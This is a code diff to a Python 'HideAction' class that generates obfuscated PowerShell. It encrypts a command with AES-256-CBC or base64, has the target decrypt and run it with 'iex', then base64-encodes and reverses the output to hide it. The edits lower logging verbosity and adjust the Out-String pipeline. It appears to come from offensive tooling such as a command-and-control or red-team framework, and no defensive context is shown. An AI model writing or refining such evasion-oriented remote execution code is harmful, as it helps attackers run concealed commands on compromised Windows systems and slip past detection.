@@ -82,7 +82,7 @@ class HideAction(BaseAction):
             logger.debug("🔐 Using AES-256-CBC encryption")
             # Encrypt the command
             encrypted = encrypt_command(command, self._AES_KEY, self._AES_IV)
-            logger.debug(f"   Encrypted: {encrypted[:80]}...")
+            logger.trace(f"Encrypted: {encrypted[:80]}...")
             
             # Build PowerShell decryption pipeline
             # Convert hex key/iv to byte arrays
@@ -100,7 +100,7 @@ class HideAction(BaseAction):
                 f"$b=[Convert]::FromBase64String($e);"
                 f"$o=$d.TransformFinalBlock($b,0,$b.Length);"
                 f"$c=[Text.Encoding]::UTF8.GetString($o);"
-                f"iex $c|Out-String"
+                f"iex $c"
             )
         else:
             # Fallback: simple base64 encoding
@@ -108,13 +108,13 @@ class HideAction(BaseAction):
             decrypt_script = (
                 f"$e='{encoded}';"
                 f"$c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e));"
-                f"iex $c|Out-String"
+                f"iex $c"
             )
 
         # Build the pipeline that outputs base64 then reverses
         # PowerShell script to execute command, base64 encode output, then reverse it
         full_script = (
-            f"$r={decrypt_script};"
+            f"$r=({decrypt_script}|Out-String);"
             f"$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($r));"
             f"-join $b[$($b.Length-1)..0]"
         )
